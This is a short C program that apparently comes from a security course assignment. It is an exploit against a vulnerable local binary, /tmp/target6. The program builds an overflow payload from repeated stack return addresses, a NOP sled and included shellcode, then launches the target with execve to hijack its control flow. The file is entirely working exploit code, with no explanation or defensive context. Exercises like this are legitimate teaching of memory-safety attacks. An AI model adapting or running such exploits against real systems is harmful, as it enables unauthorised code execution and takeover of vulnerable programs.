#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
//	char arg1[] = "Hi there!";
	char arg1[93];
	int i;
	for(i = 0; i < 93 ; i++)
		arg1[i] = 0x90;
	arg1[92] = 0;
	for(i = 0; i<32; i+=4)
		arg1[i] = 0x9d;
	for(i = 1; i<32; i+=4)
		arg1[i] = 0xfd;
	for(i = 2; i<32; i+=4)
		arg1[i] = 0xff;
	for(i = 3; i<32; i+=4)
		arg1[i] = 0xbf;
	for(i = 0; i<strlen(shellcode); i++)
		arg1[i+33] = shellcode[i];
	arg1[88] = 0x7c;
	arg1[89] = 0xfd;
	arg1[90] = 0xff;
	arg1[91] = 0xbf;
	char arg2[] = "0";
	char arg3[] = "31";
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
